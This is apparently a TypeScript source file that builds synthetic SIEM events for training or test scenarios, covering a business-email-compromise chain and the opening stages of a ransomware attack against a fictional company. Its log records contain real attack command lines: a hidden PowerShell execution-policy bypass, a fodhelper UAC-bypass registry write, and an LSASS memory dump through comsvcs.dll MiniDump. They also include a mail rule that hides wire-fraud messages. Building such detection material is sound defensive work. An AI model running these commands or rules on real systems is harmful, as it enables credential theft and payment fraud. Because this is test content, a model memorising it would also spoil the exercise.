        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // Target account that was locked out
        "winlog.event_data.TargetUserName": "r.garcia",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1106",
        // Machine that triggered the lockout
        "winlog.event_data.CallerComputerName": "SRV-ADFS01",
        // ECS fields
        "event.code": "4740",
        "event.action": "account-locked-out",
        "event.outcome": "failure",
        "event.created": "2026-05-08T08:02:00.000Z",
        "user.name": "r.garcia",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1106",
        "host.name": "DC01",
        "account.locked": "true",
        "authentication.failure_reason": "0xC0000234 — Account Locked Out (too many failed attempts)",
      },
    },
    {
      id: "evt_04_mfa_accept", ts: T(12 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_challenge",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1078",
      description: `l.harris approved an MFA push at 02:12 local time from Amsterdam, Netherlands (${attackerIp}).`,
      raw: {
        // Azure AD / Entra ID Sign-In Log — MFA fatigue victim accepted push
        "azure.signinlogs.correlation_id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "azure.signinlogs.resultType": "0",
        "azure.signinlogs.result_description": "Successfully signed in",
        "azure.signinlogs.app_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        // The MFA requirement came from the CA policy, which the push satisfied.
        "azure.signinlogs.conditional_access_status": "success",
        "azure.signinlogs.risk_level_aggregated": "high",
        "azure.signinlogs.risk_level_during_signin": "high",
        "azure.signinlogs.risk_event_types_v2": "unfamiliarFeatures",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_principal_name": "l.harris@nexacorp.com",
        "azure.signinlogs.user_display_name": "Laura Harris",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.device_detail.browser": "Chrome 124.0.0",
        "azure.signinlogs.device_detail.operating_system": "Windows 10",
        "azure.signinlogs.device_detail.device_id": "(not registered)",
        "azure.signinlogs.device_detail.is_compliant": "false",
        "azure.signinlogs.device_detail.is_managed": "false",
        "azure.signinlogs.location.city": "Amsterdam",
        "azure.signinlogs.location.country_or_region": "NL",
        // ECS fields
        "event.action": "UserLoggedIn",
        "event.outcome": "success",
        "event.created": "2026-05-08T08:12:00.000Z",
        "user.email": "l.harris@nexacorp.com",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "authentication.status": "success",
        "authentication.mfa": "Microsoft Authenticator Push",
        "authentication.factor": "push_notification",
        "risk.level": "High",
        "logon.local_time": "02:12",
        "ca_policy_applied": "Require MFA - All users",
      },
    },
    // ── First alert: Identity Protection's real-time detection on that sign-in, as it lands in Sentinel ──
    {
      id: "evt_bec_idp_alert", ts: T(12 * MIN + 20_000),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "risk_score_change",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1078", is_detection: true,
      description: `Sentinel received the Identity Protection alert "Unfamiliar sign-in properties" (High) for l.harris, source IP ${attackerIp}, unregistered Windows device.`,
      raw: {
        "AlertName": "Unfamiliar sign-in properties",
        "ProductName": "Azure Active Directory Identity Protection",
        "ProviderName": "IPC",
        "AlertSeverity": "High",
        "AlertType": "UnfamiliarLocation",
        "Status": "New",
        "CompromisedEntity": "l.harris@nexacorp.com",
        "StartTime": T(12 * MIN),
        "TimeGenerated": T(12 * MIN + 20_000),
        "Entities.Account.UPNSuffix": "nexacorp.com",
        "Entities.Account.Name": "l.harris",
        "Entities.IP.Address": attackerIp,
        "ExtendedProperties.Client IP Address": attackerIp,
        "ExtendedProperties.Client Location": "Amsterdam, North Holland, NL",
        "ExtendedProperties.Detection Timing Type": "realtime",
        "ExtendedProperties.Request Id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "event.action": "alert",
      },
    },

    // ── CORRELATED: O365 mailbox access from attacker IP immediately after login ──
    {
      id: "evt_bec_mailbox_access", ts: T(12 * MIN + 30_000),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high",
      user_email: victim.email, src_ip: attackerIp,
      mitre_technique: "T1114.002",
      description: `l.harris's mailbox was accessed from ${attackerIp} just 30 seconds after the MFA push was approved.`,
      raw: {
        "data.office365.Operation": "MailboxLogin",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": victim.email,
        "data.office365.ClientIP": attackerIp,
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        "mail.access_type": "MailboxLogin",
        "mail.folder_accessed": "Inbox",
        "event.action": "MailboxLogin",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "user.email": victim.email,
      },
    },
    {
      id: "evt_05_inbox_rule", ts: T(13 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1564.008",
      description: `A new inbox rule named ".." was created in l.harris's mailbox from ${attackerIp}: emails containing wire or banking are moved to RSS Feeds and marked as read.`,
      raw: {
        // O365 Unified Audit Log — New-InboxRule
        "data.office365.Id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
        "data.office365.RecordType": "1",
        "data.office365.CreationTime": "2026-05-08T08:13:00Z",
        "data.office365.Operation": "New-InboxRule",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "data.office365.UserType": "0",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.ExternalAccess": "false",
        // New-InboxRule cmdlet parameters, as O365 UAL actually records them
        "data.office365.Parameters[0].Name": "Name",
        "data.office365.Parameters[0].Value": "․․",
        "data.office365.Parameters[1].Name": "SubjectOrBodyContainsWords",
        "data.office365.Parameters[1].Value": "[\"wire\",\"invoice\",\"banking\",\"payment\",\"transfer\"]",
        "data.office365.Parameters[2].Name": "MoveToFolder",
        "data.office365.Parameters[2].Value": "RSS Feeds",
        "data.office365.Parameters[3].Name": "MarkAsRead",
        "data.office365.Parameters[3].Value": "True",
        "data.office365.Parameters[4].Name": "StopProcessingRules",
        "data.office365.Parameters[4].Value": "True",
      },
    },
    {
      id: "evt_06_email_scrape", ts: T(15 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `340 emails were accessed in l.harris's mailbox within 2 minutes via Outlook Web App from ${attackerIp}.`,
      raw: {
        // O365 Unified Audit Log — MailItemsAccessed (ExchangeItemAggregated)
        "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "data.office365.RecordType": "50",
        "data.office365.CreationTime": "2026-05-08T08:15:00Z",
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.MailboxOwnerUPN": "l.harris@nexacorp.com",
        "data.office365.MailboxOwnerSid": "S-1-5-21-3421479547-3897544621-1789562108-1201",
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
        "data.office365.ExternalAccess": "false",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.IsThrottled": "false",
        // MailItemsAccessed aggregates when the access is a Sync operation —
        // this is the real Microsoft behavior for reducing audit record
        // volume, and OperationCount is the actual field it uses to carry
        // the aggregate (matches the "Bind" vs "Sync" distinction: only Sync
        // batches, so this record must not also claim access_type Bind).
        "data.office365.OperationProperties.MailAccessType": "Sync",
        "data.office365.OperationCount": "340",
        "data.office365.Folders.Path": "\\Inbox, \\Sent Items, \\Drafts",
        // ECS fields
        "event.action": "MailItemsAccessed",
        "event.outcome": "success",
        "user.email": "l.harris@nexacorp.com",
        "source.ip": attackerIp,
        "application.name": "Outlook Web App",
        "session.duration_seconds": "112",
      },
    },
    {
      id: "evt_07_forward_rule", ts: T(20 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1114.003",
      description: "l.harris's mailbox was configured to auto-forward all incoming email to an external Gmail address (l.harris.backup@gmail.com).",
      raw: {
        // O365 Unified Audit Log — Set-Mailbox (ForwardingSmtpAddress)
        "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
        "data.office365.RecordType": "1",
        "data.office365.CreationTime": "2026-05-08T08:20:00Z",
        "data.office365.Operation": "Set-Mailbox",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.ObjectId": "l.harris@nexacorp.com",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        // Set-Mailbox property changes, as O365 UAL actually records them
        "data.office365.ModifiedProperties[0].Name": "ForwardingSmtpAddress",
        "data.office365.ModifiedProperties[0].NewValue": "smtp:l.harris.backup@gmail.com",
        "data.office365.ModifiedProperties[0].OldValue": "",
        "data.office365.ModifiedProperties[1].Name": "DeliverToMailboxAndForward",
        "data.office365.ModifiedProperties[1].NewValue": "True",
        "data.office365.ModifiedProperties[1].OldValue": "False",
      },
    },
    {
      id: "evt_08_wire_fraud", ts: T(25 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "email_sent",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical",
      description: `l.harris's account sent an email to CFO p.johnson requesting a $247,000 wire transfer to new banking details, replying inside an existing Apex Supplies invoice thread.`,
      raw: {
        // O365 Unified Audit Log — Send is a mailbox-audit action, RecordType 2
        // (ExchangeItem). 28 is ThreatIntelligence (Defender for Office 365 verdicts).
        "data.office365.Id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "data.office365.RecordType": "2",
        "data.office365.CreationTime": "2026-05-08T08:25:00Z",
        "data.office365.Operation": "Send",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        // Email fields
        "email.message_id": "<cabcd3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b4c5@mail.outlook.com>",
        "email.from.address": "l.harris@nexacorp.com",
        "email.from.display_name": "Laura Harris",
        "email.to.address": "p.johnson@nexacorp.com",
        "email.subject": "RE: Apex Supplies — Urgent payment update",
        "email.direction": "outbound",
        "email.size_bytes": "4217",
        // BEC enrichment fields
        // ECS fields
        "event.action": "EmailSent",
        "event.outcome": "success",
        "source.ip": attackerIp,
      },
    },
    {
      id: "evt_09_mfa_fatigue", ts: T(30 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_denied",
      user_email: "p.johnson@nexacorp.com", src_ip: sprayIp,
      severity: "high", mitre_technique: "T1621",
      description: "p.johnson (CFO) received 8 MFA push notifications in 5 minutes from the same spray IP and denied all of them, then reported it to IT.",
      raw: {
        // Azure AD / Entra ID Sign-In Log — MFA denied (all attempts)
        "azure.signinlogs.correlation_id": "f6a1b2c3-d4e5-f6a1-b2c3-d4e5f6a1b2c3",
        // 500121 = "Authentication failed during strong authentication request" — the
        // code a DENIED push writes. 50074 only means "strong auth required" (the
        // interrupt that precedes the push), not that the user rejected it.
        "azure.signinlogs.resultType": "500121",
        "azure.signinlogs.result_description": "Authentication failed during strong authentication request.",
        "azure.signinlogs.app_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "medium",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_principal_name": "p.johnson@nexacorp.com",
        "azure.signinlogs.user_display_name": "Patricia Johnson",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.location.city": "Amsterdam",
        "azure.signinlogs.location.country_or_region": "NL",
        "azure.signinlogs.device_detail.is_managed": "false",
        // ECS fields
        "event.action": "MFA_PushDenied",
        "event.outcome": "failure",
        "authentication.mfa": "push",
        "authentication.status": "failure",
        "authentication.factor": "push_notification",
        "user.email": "p.johnson@nexacorp.com",
        "source.ip": sprayIp,
        // Representative record — Entra ID writes one sign-in log entry per
        // attempt; the 8-push/5-minute total (see description) is a SIEM-side
        // aggregate across many records, not a field on any single one.
      },
    },
    {
      id: "evt_10_benign_browse", ts: T(-30 * MIN), is_baseline: true,
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: victim.email, hostname: victim.hostname, src_ip: victim.ip,
      severity: "informational",
      description: "l.harris browsed personal Gmail and LinkedIn from LAPTOP-FIN-04 before work hours.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "l.harris",
        "zscaler.url": "https://gmail.com",
        "zscaler.hostname": "gmail.com",
        "zscaler.urlcategory": "Webmail - Personal",
        "zscaler.reqmethod": "GET",
        "zscaler.cip": "10.10.30.21",
        "zscaler.reqsize": 12430,
        "user.email": "l.harris@nexacorp.com",
        "source.hostname": "LAPTOP-FIN-04",
      },
    },

    // ── CORRELATED: Baseline — l.harris normal AD login from office IP ───────────
    {
      id: "evt_bec_baseline_ad", ts: T(-20 * MIN), is_baseline: true,
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email, hostname: victim.hostname, src_ip: victim.ip,
      description: "l.harris logged on interactively to LAPTOP-FIN-04 from the office network.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": victim.hostname,
        "winlog.event_data.IpAddress": victim.ip,
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.TargetUserName": "l.harris",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": victim.ip,
        "host.name": victim.hostname,
      },
    },
  ];

  return { title: "Password Spray → BEC Mailbox Rule", events, T, MIN, victim, attackerIp, sprayIp };
}

/** Telemetry half of `buildRansomwareScenario`: the events and the story title, no answer key. */
export function ransomwareScenarioEvents() {
  const B = new Date("2026-05-06T03:15:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const zero    = { hostname: "WS-FIN-1193", email: "c.martin@nexacorp.com",  ip: "10.10.20.33" };
  const server  = { hostname: "FS-CORP-01",  email: "svc-backup@nexacorp.com", ip: "10.10.10.12" };
  // Story-specific C2 (the 185.220.101.0/24 Tor range was shared across storylines).
  const c2Ip    = "94.131.98.17";
  const c2Dom   = "edge-cdn-updates.xyz";
  const rswHash = makeSha256("lockbit3_ransom_payload");
  const psxHash = makeSha256("psexec_lateral_tool");

  const events: TelemetryEvent[] = [
    {
      // ── Why a domain admin's credentials were in this workstation's memory ──
      //
      // ADDED. The LSASS dump at 04:45 yields da-backup's hash, and everything
      // downstream — the TGT request, the pass-the-hash to the file server, the
      // encryption — depends on that. But nothing showed a domain admin ever
      // touching WS-FIN-1193, so the causal hinge of the whole scenario existed
      // only as a clause in one event's description.
      //
      // A helpdesk remote-support session the previous afternoon is both the
      // realistic explanation and the actual finding: the reason this ransomware
      // reached a file server is that a Domain Admin account was used for
      // desktop support and its credentials were left cached in memory. That is
      // what goes in the report, and it is now discoverable.
      id: "evt_00_da_session", ts: T(-14 * 60 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: zero.hostname, user_email: "da-backup@nexacorp.com",
      severity: "informational",
      description: "da-backup opened a Remote Desktop session on WS-FIN-1193 the previous afternoon and signed out 41 minutes later.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-1193",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.LogonProcessName": "User32 ",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": "WS-ITHELP-02",
        "winlog.event_data.IpAddress": "10.10.5.22",
        "winlog.event_data.TargetLogonId": "0x5B21A7",
        // Ticket linkage / group-membership context (INC-38104, "Domain Admins")
        // is SIEM correlation metadata a domain controller's raw 4624 record
        // never carries — moved out of `raw` rather than given a fabricated
        // Windows Security field name.
      },
    },
    {
      id: "evt_00_context", ts: T(-30 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "informational",
      description: "c.martin logged on to WS-FIN-1193 at 02:45 — outside normal business hours.",
      raw: {
        // Windows Security Event 4624 — Successful Logon (unusual time: 02:45)
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-1193",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048196",
        // Subject (SYSTEM on interactive logon)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-1193$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1205",
        "winlog.event_data.TargetUserName": "cmartin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0x7A1B33",
        "winlog.event_data.LogonGuid": "{B2C3D4E5-F6A1-B2C3-D4E5-F6A1B2C3D4E5}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-1193",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.33",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-06T02:45:00.000Z",
        "user.name": "NEXACORP\\cmartin",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1205",
        "host.name": "WS-FIN-1193",
        "source.ip": "10.10.20.33",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
      },
    },
    {
      id: "evt_01_phish", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: zero.email, src_ip: "91.108.56.200",
      severity: "high", mitre_technique: "T1566.001",
      description: "c.martin received an email with a macro-enabled Word attachment (Salary_Adjustment_Notice.docm) from a domain registered 2 days ago. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "payroll@nexacorp-updates.net",
        "email.to.address": "c.martin@nexacorp.com",
        "email.subject": "Salary Adjustment Notice — Immediate Review Required",
        "email.attachment.name": "Salary_Adjustment_Notice.docm",
        "email.direction": "inbound",
        "file.size": "52480",
        "source.ip": "91.108.56.200",
        "spf.result": "fail", "dkim.result": "fail",
        "action_result": "delivered",
        "threat.category": "Phishing",
      },
    },
    {
      id: "evt_02_macro", ts: T(45_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "critical", mitre_technique: "T1059.001",
      description: "WINWORD.EXE on WS-FIN-1193 spawned a hidden PowerShell process with execution policy bypass, running a script from c.martin's Temp folder, 45 seconds after the phishing mail was delivered.",
      process: {
        name: "powershell.exe", pid: 7741, parent_name: "WINWORD.EXE", parent_pid: 2244,
        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\cmartin\\AppData\\Local\\Temp\\pay_adj.ps1",
        user: "NEXACORP\\cmartin", integrity: "medium",
      },
      raw: {
        "event.action": "process_created",
        "process.name": "powershell.exe", "process.pid": "7741",
        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\cmartin\\AppData\\Local\\Temp\\pay_adj.ps1",
        "process.parent.name": "WINWORD.EXE", "process.parent.pid": "2244",
        "user.name": "NEXACORP\\cmartin", "host.name": "WS-FIN-1193",
        "process.integrity": "medium",
      },
    },
    {
      id: "evt_03_c2", ts: T(3 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: zero.hostname, src_ip: zero.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Dom, url: `https://${c2Dom}/updates`, bytes_out: 1024, bytes_in: 8192 },
      description: `powershell.exe on WS-FIN-1193 began connecting to ${c2Dom} every 60 seconds. The site uses a self-signed certificate and the domain was registered 2 days ago.`,
      raw: {
        "event.action": "network-connection-allowed",
        "source.ip": "10.10.20.33", "source.port": "51204",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "url.full": `https://${c2Dom}/updates`, "url.domain": c2Dom,
        "tls.version": "TLSv1.3", "tls.server.subject": `CN=${c2Dom}`,
        "tls.server.issuer": `CN=${c2Dom}`,
        "tls.certificate.self_signed": "true",
        "tls.server_certificate.not_after": "2026-08-15",
        "network.vlan.id": "10",
        "action_result": "allow", "tls_inspection": "disabled",
      },
    },
    // Privilege escalation. Opening lsass.exe with PROCESS_ALL_ACCESS needs
    // SeDebugPrivilege, which a medium-integrity process does not hold — so the
    // beacon has to elevate first. The fodhelper UAC bypass is the step that
    // makes the credential dump below possible, and it leaves its own tracks.
    {
      id: "evt_03b_uac_regkey", ts: T(87 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: zero.hostname, user_email: zero.email,
      severity: "high", mitre_technique: "T1548.002",
      description: "A DelegateExecute value was written under the ms-settings shell-open key in c.martin's registry hive on WS-FIN-1193.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T04:42:00.000Z",
        "winlog.event_data.EventType": "SetValue",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "7741",
        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.TargetObject": "HKU\\S-1-5-21-3421479547-3897544621-1789562108-1205\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DelegateExecute",
        "winlog.event_data.Details": "",
        "winlog.event_data.User": "NEXACORP\\cmartin",
      },
    },
    {
      id: "evt_03c_uac_bypass", ts: T(88 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "high", mitre_technique: "T1548.002",
      process: {
        name: "fodhelper.exe", pid: 6120, parent_name: "powershell.exe", parent_pid: 7741,
        cmdline: "fodhelper.exe",
        user: "NEXACORP\\cmartin", integrity: "high",
      },
      description: "fodhelper.exe started at High integrity on WS-FIN-1193 with powershell.exe as its parent, one minute after the registry write.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T04:43:00.000Z",
        "winlog.event_data.ProcessGuid": "{f1e2d3c4-b5a6-a1b2-0006-c3d4e5f60006}",
        "winlog.event_data.ProcessId": "6120",
        "winlog.event_data.Image": "C:\\Windows\\System32\\fodhelper.exe",
        "winlog.event_data.CommandLine": "fodhelper.exe",
        "winlog.event_data.ParentProcessGuid": "{f1e2d3c4-b5a6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.ParentProcessId": "7741",
        "winlog.event_data.User": "NEXACORP\\cmartin",
        "winlog.event_data.IntegrityLevel": "High",
        "winlog.event_data.OriginalFileName": "FODHELPER.EXE",
        "winlog.event_data.Company": "Microsoft Corporation",
      },
    },
    {
      id: "evt_04_lsass", ts: T(90 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email,
      severity: "critical", mitre_technique: "T1003.001",
      process: {
        name: "rundll32.exe", pid: 9914, parent_name: "fodhelper.exe", parent_pid: 6120,
        cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Windows\\Temp\\mem.dmp full",
        user: "NEXACORP\\cmartin", integrity: "high",
      },
      file: { path: "C:\\Windows\\Temp\\mem.dmp" },
      description: "CrowdStrike detected rundll32.exe on WS-FIN-1193 using comsvcs.dll to dump lsass.exe memory to mem.dmp.",
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simpleName": "CredentialDumpingTool",
        "crowdstrike.detection.id": "ldt:72da24cc88455eba983a41086ca47bd9:1234567899",
        "crowdstrike.detection.description": "rundll32.exe used the comsvcs.dll MiniDump export to read lsass.exe process memory with PROCESS_ALL_ACCESS. Consistent with credential theft.",
        "crowdstrike.detection.scenario": "credential_theft_lsass_dump",
        "crowdstrike.detection.tactic": "Credential Access",
        "crowdstrike.detection.tactic_id": "TA0006",
        "crowdstrike.detection.technique": "OS Credential Dumping: LSASS Memory",
        "crowdstrike.detection.technique_id": "T1003.001",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.sensor.id": "f39112445887350f38aa585b7c88d6ab",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        // Source process — rundll32.exe (the LOLBin doing the dump)
        "process.name": "rundll32.exe", "process.pid": "9914",
        "process.command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Windows\\Temp\\mem.dmp full",
        "process.parent.name": "fodhelper.exe", "process.parent.pid": "6120",
        // Target process — lsass.exe (the victim of the memory dump)
        "process.target.name": "lsass.exe",
        "process.target.pid": "704",
        "process.target.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
        "process.target.access_rights": "0x1FFFFF",
        // LOLBAS — comsvcs.dll
        "lolbas.name": "comsvcs.dll",
        "lolbas.function": "MiniDump",
        "lolbas.signed": "true",
        "lolbas.vendor": "Microsoft Corporation",
        // Output file (the credential dump)
        "file.path": "C:\\Windows\\Temp\\mem.dmp",
        "file.type": "memory_dump",
        "user.name": "NEXACORP\\cmartin",
        "host.name": "WS-FIN-1193",
      },
    },
    {
      id: "evt_04b_kerberos_tgt", ts: T(92 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
      hostname: "DC-CORP-01", user_email: zero.email,
      severity: "critical", mitre_technique: "T1550.002",
      description: "A Kerberos TGT for domain admin account da-backup was requested from WS-FIN-1193 using RC4 encryption, two minutes after the LSASS dump.",
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1108",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketOptions": "0x40810010",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": zero.ip ?? "10.10.20.33",
        "winlog.event_data.IpPort": "51888",
